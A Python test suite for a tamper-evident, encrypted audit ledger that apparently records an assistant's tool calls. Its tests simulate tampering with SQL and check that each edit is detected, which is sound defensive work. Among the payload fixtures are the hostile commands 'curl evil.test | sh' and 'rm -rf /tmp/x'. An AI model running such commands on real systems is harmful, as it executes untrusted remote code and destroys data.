"""test_ledger.py - the tamper-evident record, attacked.

Most of these tests are the attack, not the happy path. A chain that verifies
its own clean state proves nothing; what has to be proved is that every way of
quietly editing the record afterwards comes back as a problem, with a name
that says which kind of problem it is.

The edits are made with plain SQL against the database file, because that is
what an attacker - or a well-meaning script, or a future version of this
project - actually has: the file, and sqlite3. Nothing here goes through the
module's own write path to produce the damage it then detects.

The one case that must NOT look like an attack is redaction. If "forget this"
and "someone tampered with this" report the same way, the forgetting path is
unusable, and the whole reason the chain covers metadata only is gone.
"""

import json
import os
import sqlite3
import stat
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).parent))
import jarvis_ledger as L


class Sandbox(unittest.TestCase):
    """Database, key file and anchor file all in a fresh temp directory.

    The key file in particular must not be shared: the chain hash is an HMAC
    under it, so one leaked key between tests would let an entry written by an
    earlier test verify inside a later test's chain.
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        d = Path(self.tmp.name)
        self._old = (L.DB_PATH, L.KEY_PATH, L.ANCHOR_PATH)
        L.DB_PATH = d / "ledger.db"
        L.KEY_PATH = d / "ledger.key"
        L.ANCHOR_PATH = d / "ledger-anchors.jsonl"
        L._INITED.discard(str(L.DB_PATH))

    def tearDown(self):
        L._KEYS.pop(str(L.KEY_PATH), None)
        L._INITED.discard(str(L.DB_PATH))
        L.DB_PATH, L.KEY_PATH, L.ANCHOR_PATH = self._old
        self.tmp.cleanup()

    # -- helpers ----------------------------------------------------------

    def sql(self, statement, args=()):
        """Edit the database the way someone with the file would."""
        con = sqlite3.connect(str(L.DB_PATH))
        try:
            con.execute(statement, args)
            con.commit()
        finally:
            con.close()

    def fill(self, n=5, turn="t1"):
        seqs = []
        for i in range(n):
            seqs.append(L.record("tool.call",
                                 {"turn": turn, "action": "send_email",
                                  "tier": "ask", "lane": "local",
                                  "rule": "autonomy.tiers"},
                                 payload=f"body number {i}"))
        return seqs

    def codes(self, v):
        return sorted({p["code"] for p in v["problems"]})


# ==========================================================================
#   1. A clean chain
# ==========================================================================

class CleanChain(Sandbox):

    def test_a_clean_chain_verifies(self):
        self.fill(5)
        v = L.verify()
        self.assertTrue(v["ok"], v["problems"])
        self.assertEqual(v["entries"], 5)
        self.assertEqual(v["last_seq"], 5)

    def test_a_clean_chain_verifies_in_full_too(self):
        self.fill(4)
        v = L.verify(full=True)
        self.assertTrue(v["ok"], v["problems"])
        self.assertEqual(v["with_payload"], 4)

    def test_an_empty_ledger_is_not_a_problem(self):
        """Nothing recorded yet is a state, not a failure. A first-boot HUD
        that shows a red integrity banner teaches people to ignore it."""
        v = L.verify()
        self.assertTrue(v["ok"])
        self.assertEqual(v["entries"], 0)

    def test_sequence_numbers_are_monotonic_and_start_at_one(self):
        self.assertEqual(self.fill(3), [1, 2, 3])

    def test_an_entry_with_no_payload_is_recorded_as_having_none(self):
        seq = L.record("router.decision", {"turn": "t1", "lane": "local"})
        self.assertIsNone(L.payload(seq))
        self.assertTrue(L.verify(full=True)["ok"])


# ==========================================================================
#   2. Editing the record afterwards
# ==========================================================================

class Tampering(Sandbox):

    def test_editing_a_metadata_field_is_detected(self):
        self.fill(5)
        # The single most useful edit for someone covering their tracks: the
        # action ran at "ask" and the record now says it was "auto".
        row = self._meta(3)
        row["tier"] = "auto"
        self.sql("UPDATE chain SET meta=? WHERE seq=3",
                 (json.dumps(row, sort_keys=True, separators=(",", ":")),))
        v = L.verify()
        self.assertFalse(v["ok"])
        self.assertIn("metadata_edited", self.codes(v))
        self.assertEqual([p["seq"] for p in v["problems"]], [3])

    def test_editing_a_timestamp_is_detected(self):
        self.fill(3)
        self.sql("UPDATE chain SET ts=? WHERE seq=2", (time.time() - 86400,))
        self.assertIn("metadata_edited", self.codes(L.verify()))

    def test_editing_the_event_name_is_detected(self):
        self.fill(3)
        self.sql("UPDATE chain SET event='router.decision' WHERE seq=2")
        self.assertIn("metadata_edited", self.codes(L.verify()))

    def test_deleting_an_entry_is_detected(self):
        self.fill(5)
        self.sql("DELETE FROM chain WHERE seq=3")
        v = L.verify()
        self.assertFalse(v["ok"])
        self.assertIn("entry_deleted", self.codes(v))
        self.assertIn(3, [p["seq"] for p in v["problems"]])

    def test_reordering_two_entries_is_detected(self):
        """Swap two entries' sequence numbers, which is what "reordered"
        means in a table keyed by one. The contents and hashes travel with the
        rows, so nothing is edited - only moved."""
        self.fill(5)
        self.sql("UPDATE chain SET seq=99 WHERE seq=2")
        self.sql("UPDATE chain SET seq=2 WHERE seq=3")
        self.sql("UPDATE chain SET seq=3 WHERE seq=99")
        v = L.verify()
        self.assertFalse(v["ok"])
        self.assertIn("reordered", self.codes(v))

    def test_truncating_the_tail_is_reported_as_truncation(self):
        """Cutting off the end leaves a chain that is internally perfect.
        Every link, every hash, every payload still checks out - there is
        nothing inside the remaining rows that knows the others existed. If
        this came back as generic corruption the report would be actively
        misleading about what happened."""
        self.fill(6)
        L.anchor()
        self.sql("DELETE FROM chain WHERE seq > 3")
        self.sql("DELETE FROM payloads WHERE seq > 3")
        v = L.verify()
        self.assertFalse(v["ok"])
        self.assertTrue(v["truncated"])
        self.assertEqual(self.codes(v), ["truncated"])
        self.assertEqual(v["last_seq"], 3)

    def test_rewriting_history_before_an_anchor_is_detected(self):
        """The anchor is the whole point of anchoring: the key is local, so a
        forger can recompute every hash from the edited entry onwards and
        produce a chain that verifies against itself. It cannot change a hash
        that was already written down somewhere it does not rewrite."""
        self.fill(4)
        L.anchor()
        anchored = L.verify()["head"]
        # A forgery that reaches all the way to the head: edit entry 2, then
        # recompute 2, 3 and 4 so the chain is internally consistent again.
        self._forge(2, {"tier": "auto"})
        inner = L.verify()
        self.assertIn("anchor_mismatch", self.codes(inner))
        self.assertNotEqual(inner["head"], anchored)

    def test_a_forged_rewrite_would_otherwise_verify_clean(self):
        """Stated plainly so nobody reads the previous test as stronger than
        it is: without the anchor file, the forgery above is undetectable."""
        self.fill(4)
        L.ANCHOR_PATH.unlink()          # the copy you did not keep
        self._forge(2, {"tier": "auto"})
        v = L.verify()
        self.assertEqual(v["anchors"], 0)
        self.assertTrue(v["ok"], v["problems"])

    def test_editing_the_turn_index_is_detected(self):
        """The turn column is outside the hash - it exists so why() can use an
        index - so it gets its own check. Otherwise moving an entry into
        another turn's trace would verify clean."""
        self.fill(3)
        self.sql("UPDATE chain SET turn='t9' WHERE seq=2")
        self.assertIn("index_edited", self.codes(L.verify()))

    # -- helpers ---------------------------------------------------------

    def _meta(self, seq):
        con = sqlite3.connect(str(L.DB_PATH))
        try:
            return json.loads(con.execute("SELECT meta FROM chain WHERE seq=?",
                                          (seq,)).fetchone()[0])
        finally:
            con.close()

    def _forge(self, seq, changes):
        """Rewrite one entry and every entry after it, the way someone holding
        the key would. This is the attack the anchors exist for."""
        con = sqlite3.connect(str(L.DB_PATH))
        con.row_factory = sqlite3.Row
        try:
            rows = con.execute("SELECT * FROM chain ORDER BY seq ASC").fetchall()
            prev = L._GENESIS
            for r in rows:
                meta = json.loads(r["meta"])
                if r["seq"] == seq:
                    meta.update(changes)
                mj = L._canonical(meta)
                eh = L._entry_hash(r["seq"], r["ts"], r["event"], mj,
                                   r["payload_hash"], prev)
                con.execute("UPDATE chain SET meta=?,prev_hash=?,entry_hash=? "
                            "WHERE seq=?", (mj, prev, eh, r["seq"]))
                prev = eh
            con.execute("UPDATE ledger_head SET seq=?,hash=? WHERE id=1",
                        (rows[-1]["seq"], prev))
            con.commit()
        finally:
            con.close()


# ==========================================================================
#   3. Payloads: encryption, authentication, and swapping
# ==========================================================================

class Payloads(Sandbox):

    def test_a_payload_round_trips(self):
        seq = L.record("tool.call", {"turn": "t1"}, payload="rm -rf /tmp/x")
        self.assertEqual(L.payload(seq), "rm -rf /tmp/x")

    def test_the_payload_is_not_stored_in_the_clear(self):
        L.record("tool.call", {"turn": "t1"}, payload="the quick brown fox")
        blob = L.DB_PATH.read_bytes()
        self.assertNotIn(b"the quick brown fox", blob)

    def test_a_flipped_ciphertext_bit_refuses_rather_than_returning_garbage(self):
        """Encrypt-then-MAC, and the tag is checked BEFORE the XOR. A stream
        cipher will happily "decrypt" anything you hand it, so a caller who
        gets bytes back alongside a warning flag will use the bytes."""
        seq = L.record("tool.call", {"turn": "t1"}, payload="transfer 10 EUR")
        con = sqlite3.connect(str(L.DB_PATH))
        ct = bytearray(con.execute("SELECT ct FROM payloads WHERE seq=?",
                                   (seq,)).fetchone()[0])
        con.close()
        ct[0] ^= 0x01
        self.sql("UPDATE payloads SET ct=? WHERE seq=?", (bytes(ct), seq))
        with self.assertRaises(L.LedgerTampered):
            L.payload(seq)

    def test_a_flipped_tag_bit_also_refuses(self):
        seq = L.record("tool.call", {"turn": "t1"}, payload="hello")
        con = sqlite3.connect(str(L.DB_PATH))
        tag = bytearray(con.execute("SELECT tag FROM payloads WHERE seq=?",
                                    (seq,)).fetchone()[0])
        con.close()
        tag[-1] ^= 0x80
        self.sql("UPDATE payloads SET tag=? WHERE seq=?", (bytes(tag), seq))
        with self.assertRaises(L.LedgerTampered):
            L.payload(seq)

    def test_swapping_a_payload_for_another_entrys_is_detected(self):
        """Moving a payload between entries needs no key: it is a copy of two
        blobs. The sequence number is inside the MAC precisely so that it
        fails anyway."""
        a = L.record("tool.call", {"turn": "t1", "action": "send_email"},
                     payload="dinner on thursday?")
        b = L.record("tool.call", {"turn": "t1", "action": "run_shell_on_host"},
                     payload="curl evil.test | sh")
        con = sqlite3.connect(str(L.DB_PATH))
        rows = {r[0]: r[1:] for r in con.execute(
            "SELECT seq,kind,nonce,ct,tag FROM payloads").fetchall()}
        con.close()
        self.sql("UPDATE payloads SET kind=?,nonce=?,ct=?,tag=? WHERE seq=?",
                 (*rows[b], a))
        with self.assertRaises(L.LedgerTampered):
            L.payload(a)
        v = L.verify(full=True)
        self.assertFalse(v["ok"])
        self.assertIn("payload_tampered", self.codes(v))

    def test_a_payload_replaced_by_one_re_encrypted_with_the_key_is_detected(self):
        """The stronger version of the swap: the forger has the key, so the
        tag is valid. The chain's commitment to the original payload is what
        catches it - and it is an HMAC, so it does not become a dictionary
        attack on a short payload after the payload is redacted away."""
        seq = L.record("tool.call", {"turn": "t1"}, payload="send 10 EUR")
        nonce, ct, tag = L._encrypt(seq, b"send 10000 EUR")
        self.sql("UPDATE payloads SET nonce=?,ct=?,tag=? WHERE seq=?",
                 (nonce, ct, tag, seq))
        self.assertEqual(L.payload(seq), "send 10000 EUR")   # it decrypts fine
        v = L.verify(full=True)
        self.assertFalse(v["ok"])
        self.assertIn("payload_replaced", self.codes(v))

    def test_a_payload_that_vanishes_without_a_reason_is_not_redaction(self):
        self.fill(3)
        self.sql("DELETE FROM payloads WHERE seq=2")
        v = L.verify()
        self.assertFalse(v["ok"])
        self.assertIn("payload_missing", self.codes(v))

    def test_bytes_and_json_payloads_keep_their_type(self):
        a = L.record("x", {"turn": "t"}, payload=b"\x00\xff binary")
        b = L.record("x", {"turn": "t"}, payload={"to": "a@b.c", "n": 2})
        self.assertEqual(L.payload(a), b"\x00\xff binary")
        self.assertEqual(L.payload(b), {"to": "a@b.c", "n": 2})

    def test_an_oversized_payload_is_refused_not_truncated(self):
        with mock.patch.object(L, "_cfg", lambda k, d: 1 if k == "max_payload_kb" else d):
            with self.assertRaises(ValueError):
                L.record("x", {"turn": "t"}, payload="x" * 4000)


# ==========================================================================
#   4. The key file
# ==========================================================================

class KeyFile(Sandbox):

    @unittest.skipIf(os.name == "nt", "no POSIX permission bits on Windows")
    def test_the_key_file_is_created_0600(self):
        """Not chmod-ed to 0600 after the fact - created with it. The gap
        between "written" and "chmod-ed" is short and is still a gap."""
        L.record("x", {"turn": "t"}, payload="secret")
        self.assertTrue(L.KEY_PATH.exists())
        mode = stat.S_IMODE(L.KEY_PATH.stat().st_mode)
        self.assertEqual(oct(mode), oct(0o600))

    @unittest.skipIf(os.name == "nt", "no POSIX permission bits on Windows")
    def test_a_loose_key_file_is_tightened_and_reported(self):
        L.record("x", {"turn": "t"})
        os.chmod(L.KEY_PATH, 0o644)
        L._KEYS.pop(str(L.KEY_PATH), None)
        L._keys()
        self.assertEqual(L.status()["key_mode"], "0600")

    def test_the_key_is_not_reused_between_ledgers(self):
        """Each sandbox gets its own key, so an entry from one chain cannot
        verify inside another. This asserts the caching is keyed by path
        rather than held in one module-level variable."""
        L.record("x", {"turn": "t"})
        first = L._keys()["chain"]
        other = Path(self.tmp.name) / "second.key"
        old = L.KEY_PATH
        L.KEY_PATH = other
        try:
            self.assertNotEqual(L._keys()["chain"], first)
        finally:
            L._KEYS.pop(str(other), None)
            L.KEY_PATH = old


# ==========================================================================
#   5. Redaction - a legitimate state, not damage
# ==========================================================================

class Redaction(Sandbox):

    def test_a_redacted_payload_still_verifies_and_is_not_tampering(self):
        seqs = self.fill(5)
        L.redact(seqs[2], reason="owner asked")
        v = L.verify(full=True)
        self.assertTrue(v["ok"], v["problems"])
        self.assertEqual(v["redacted"], 1)

    def test_a_redacted_entry_says_so_rather_than_going_blank(self):
        seqs = self.fill(3)
        out = L.redact(seqs[1], reason="contained a medical detail")
        self.assertTrue(out["changed"])
        self.assertIn("content removed", out["note"])
        self.assertIn("decision preserved", out["note"])
        row = [e for e in L.entries(10) if e["seq"] == seqs[1]][0]
        self.assertTrue(row["redacted"])
        self.assertIn("content removed", row["note"])

    def test_the_payload_is_actually_gone(self):
        seq = L.record("tool.call", {"turn": "t1"}, payload="the private bit")
        L.redact(seq, "gone")
        self.assertNotIn(b"the private bit", L.DB_PATH.read_bytes())
        with self.assertRaises(LookupError):
            L.payload(seq)

    def test_redaction_does_not_break_the_chain_for_later_entries(self):
        seqs = self.fill(4)
        L.redact(seqs[0], "first one")
        L.record("tool.call", {"turn": "t1"}, payload="after the redaction")
        self.assertTrue(L.verify(full=True)["ok"])

    def test_the_redaction_is_itself_recorded(self):
        seqs = self.fill(2)
        L.redact(seqs[0], "owner asked")
        events = [e for e in L.entries(20) if e["event"] == "ledger.redacted"]
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0]["meta"]["target_seq"], seqs[0])
        self.assertEqual(events[0]["meta"]["reason"], "owner asked")

    def test_redacting_twice_is_a_no_op_not_an_error(self):
        seq = L.record("x", {"turn": "t"}, payload="p")
        L.redact(seq, "once")
        again = L.redact(seq, "twice")
        self.assertFalse(again["changed"])
        self.assertTrue(L.verify()["ok"])

    def test_a_payload_left_behind_after_redaction_is_a_problem(self):
        """The inverse of the redaction test: an entry marked redacted whose
        content is still sitting in the database has not been redacted, and
        must not be shown as though it had."""
        seq = L.record("x", {"turn": "t"}, payload="still here")
        self.sql("UPDATE chain SET state='redacted', closed_at=? WHERE seq=?",
                 (time.time(), seq))
        self.assertIn("payload_not_dropped", self.codes(L.verify()))


# ==========================================================================
#   6. Retention
# ==========================================================================

class Retention(Sandbox):

    def test_expiry_drops_payloads_and_keeps_the_chain_verifiable(self):
        self.fill(5)
        out = L.expire(before=time.time() + 1)
        self.assertEqual(out["expired"], 5)
        v = L.verify(full=True)
        self.assertTrue(v["ok"], v["problems"])
        self.assertEqual(v["expired"], 5)
        self.assertEqual(v["entries"], 6)     # the five, plus the expiry record

    def test_expiry_keeps_the_metadata(self):
        seqs = self.fill(3)
        L.expire(before=time.time() + 1)
        t = L.why("t1")
        self.assertEqual(t["tier"], "ask")
        self.assertEqual(t["lane"], "local")
        self.assertEqual(len(t["steps"]), 3)
        self.assertEqual(t["redacted_steps"], 3)
        self.assertTrue(all("content removed" in s["note"] for s in t["steps"]))
        self.assertIn(seqs[0], [s["seq"] for s in t["steps"]])

    def test_nothing_recent_expires(self):
        self.fill(3)
        self.assertEqual(L.expire(before=time.time() - 3600)["expired"], 0)

    def test_a_retention_window_of_zero_means_keep_not_purge(self):
        """The reading that costs you everything: 0 as "older than zero days,
        so all of it". It means the owner turned retention off."""
        self.fill(3)
        with mock.patch.object(L, "_cfg",
                               lambda k, d: 0 if k == "retention_days" else d):
            out = L.expire()
        self.assertEqual(out["expired"], 0)
        self.assertEqual(L.verify()["with_payload"], 3)

    def test_expiry_never_removes_an_entry(self):
        before = len(self.fill(4))
        L.expire(before=time.time() + 1)
        self.assertGreaterEqual(L.verify()["entries"], before)
        self.assertTrue(L.verify()["ok"])


# ==========================================================================
#   7. The why-trace
# ==========================================================================

class WhyTrace(Sandbox):

    RETRIEVED = [{"title": "Dentist appointment", "ts": 1750000000.0, "id": "m1",
                  "score": 0.82, "text": "root canal, Dr Halloran, 14:30"},
                 {"title": "Car insurance renewal", "ts": 1751111111.0, "id": "m2",
                  "score": 0.71, "text": "policy AX-99 expires in March"}]
    SKIPPED = [{"title": "Bank statement March", "ts": 1749999999.0, "id": "m3",
                "why": "private store, cloud lane", "text": "IBAN and balance"}]

    def _turn(self):
        L.record("router.decision",
                 {"turn": "t42", "lane": "local", "tier": "auto",
                  "rule": "privacy.local_only_topics"})
        L.record("memory.retrieve",
                 {"turn": "t42", "lane": "local",
                  "retrieved": [{k: v for k, v in m.items() if k != "text"}
                                for m in self.RETRIEVED],
                  "skipped": [{k: v for k, v in m.items() if k != "text"}
                              for m in self.SKIPPED]},
                 payload="\n".join(m["text"] for m in self.RETRIEVED))
        L.record("tool.call",
                 {"turn": "t42", "action": "send_email", "tier": "ask",
                  "lane": "local", "rule": "autonomy.tiers"},
                 payload="To: dentist@example.test\n\nCan we move to Friday?")

    def test_why_returns_the_lane_the_tier_and_the_rule(self):
        self._turn()
        t = L.why("t42")
        self.assertTrue(t["found"])
        self.assertEqual(t["lane"], "local")
        self.assertEqual(t["tier"], "ask")
        self.assertEqual(t["action"], "send_email")
        self.assertEqual(t["rule"], "autonomy.tiers")
        self.assertIn("privacy.local_only_topics", t["rules"])
        self.assertEqual(len(t["steps"]), 3)

    def test_why_returns_retrieved_titles_and_times(self):
        self._turn()
        t = L.why("t42")
        self.assertEqual([m["title"] for m in t["retrieved"]],
                         ["Dentist appointment", "Car insurance renewal"])
        self.assertEqual(t["retrieved"][0]["ts"], 1750000000.0)
        self.assertTrue(t["retrieved"][0]["when"])

    def test_why_says_what_was_skipped_and_why(self):
        self._turn()
        t = L.why("t42")
        self.assertEqual(len(t["skipped"]), 1)
        self.assertEqual(t["skipped"][0]["title"], "Bank statement March")
        self.assertIn("cloud lane", t["skipped"][0]["why"])

    def test_why_never_returns_memory_content(self):
        """The trace is shown to explain a decision. If it also carried the
        text of the memories it consulted, the explanation screen would be a
        second, unguarded copy of the private store."""
        self._turn()
        blob = json.dumps(L.why("t42"))
        for secret in ("root canal", "Dr Halloran", "AX-99", "IBAN",
                       "dentist@example.test", "move to Friday"):
            self.assertNotIn(secret, blob)

    def test_why_survives_redaction_and_says_so(self):
        self._turn()
        target = [s["seq"] for s in L.why("t42")["steps"]
                  if s["event"] == "tool.call"][0]
        L.redact(target, "owner asked")
        t = L.why("t42")
        step = [s for s in t["steps"] if s["seq"] == target][0]
        self.assertTrue(step["redacted"])
        self.assertIn("content removed", step["note"])
        self.assertIn("decision preserved", step["note"])
        # The decision itself is untouched.
        self.assertEqual(step["action"], "send_email")
        self.assertEqual(step["tier"], "ask")
        self.assertEqual(t["rule"], "autonomy.tiers")
        self.assertTrue(L.verify(full=True)["ok"])

    def test_an_unknown_turn_is_empty_not_an_error(self):
        self._turn()
        t = L.why("nope")
        self.assertFalse(t["found"])
        self.assertEqual(t["steps"], [])

    def test_the_trace_is_flat_enough_to_render(self):
        """No nesting a template has to walk: lists of small dicts with stable
        keys, and every key present whether or not it was recorded."""
        self._turn()
        t = L.why("t42")
        for step in t["steps"]:
            self.assertEqual(set(step) >= {"seq", "ts", "event", "action", "tier",
                                           "lane", "rule", "redacted", "note"}, True)
        for m in t["retrieved"] + t["skipped"]:
            self.assertEqual(set(m), {"title", "ts", "when", "id", "score",
                                      "why", "seq"})

    def test_content_in_the_metadata_is_refused_at_the_call_site(self):
        """The chain/payload split only works if callers honour it, and the
        way to make them honour it is to refuse, not to document."""
        with self.assertRaises(ValueError) as e:
            L.record("memory.retrieve", {"turn": "t1", "note": "x" * 900})
        self.assertIn("payload", str(e.exception))


# ==========================================================================
#   8. Anchors
# ==========================================================================

class Anchors(Sandbox):

    def test_anchor_writes_the_current_head(self):
        self.fill(3)
        a = L.anchor()
        self.assertEqual(a["seq"], 3)
        self.assertEqual(a["head"], L.verify()["head"])

    def test_a_fresh_ledger_anchors_itself_immediately(self):
        """A ledger whose first anchor is 25 entries away has 25 entries that
        nothing outside the database attests to. The first write anchors."""
        self.fill(1)
        self.assertEqual(json.loads(L.ANCHOR_PATH.read_text("utf-8").strip())["seq"], 1)

    def test_verify_reports_the_last_verified_point(self):
        self.fill(3)
        L.anchor()
        self.fill(2)
        v = L.verify()
        self.assertTrue(v["ok"])
        self.assertEqual(v["last_verified_seq"], 3)
        self.assertIsNotNone(v["last_verified_at"])
        self.assertEqual(v["anchors_ok"], v["anchors"])

    def test_anchors_are_appended_never_rewritten(self):
        self.fill(2)
        L.ANCHOR_PATH.unlink()          # drop the automatic first-write anchor
        L.anchor()
        self.fill(2)
        L.anchor()
        lines = L.ANCHOR_PATH.read_text("utf-8").strip().splitlines()
        self.assertEqual(len(lines), 2)
        self.assertEqual([json.loads(x)["seq"] for x in lines], [2, 4])

    def test_a_corrupt_anchor_line_is_reported_as_corrupt_not_as_a_rewrite(self):
        self.fill(2)
        L.anchor()
        with L.ANCHOR_PATH.open("a", encoding="utf-8") as f:
            f.write('{"seq": 2, "head": "hal\n')
        v = L.verify()
        self.assertIn("anchor_unreadable", self.codes(v))
        self.assertNotIn("anchor_mismatch", self.codes(v))

    def test_anchoring_happens_on_its_own_every_n_entries(self):
        with mock.patch.object(L, "_cfg", lambda k, d: 3 if k == "anchor_every_entries"
                               else (0 if k == "anchor_every_minutes" else d)):
            self.fill(6)
        seqs = [json.loads(x)["seq"]
                for x in L.ANCHOR_PATH.read_text("utf-8").strip().splitlines()]
        self.assertEqual(seqs, [3, 6])

    def test_anchoring_an_empty_ledger_writes_nothing(self):
        self.assertIsNone(L.anchor())
        self.assertFalse(L.ANCHOR_PATH.exists())


# ==========================================================================
#   9. entries() and status()
# ==========================================================================

class Views(Sandbox):

    def test_entries_returns_metadata_only(self):
        L.record("tool.call", {"turn": "t1", "action": "send_email"},
                 payload="the body nobody should see here")
        blob = json.dumps(L.entries(10))
        self.assertNotIn("nobody should see", blob)
        self.assertIn("send_email", blob)

    def test_entries_honours_limit_and_since(self):
        self.fill(10)
        self.assertEqual(len(L.entries(3)), 3)
        self.assertEqual([e["seq"] for e in L.entries(3)], [8, 9, 10])
        cut = L.entries(10)[5]["ts"]
        self.assertTrue(all(e["ts"] >= cut for e in L.entries(50, since=cut)))

    def test_status_counts_the_states_separately(self):
        seqs = self.fill(4)
        L.record("router.decision", {"turn": "t1", "lane": "local"})
        L.redact(seqs[0], "asked")
        s = L.status()
        self.assertEqual(s["redacted"], 1)
        self.assertEqual(s["with_payload"], 3)
        self.assertGreaterEqual(s["no_payload"], 2)   # the router row, the redact row
        self.assertEqual(s["head_seq"], s["entries"])

    def test_status_does_not_decrypt_anything(self):
        L.record("x", {"turn": "t"}, payload="private")
        self.assertNotIn("private", json.dumps(L.status()))


if __name__ == "__main__":
    unittest.main(verbosity=2)
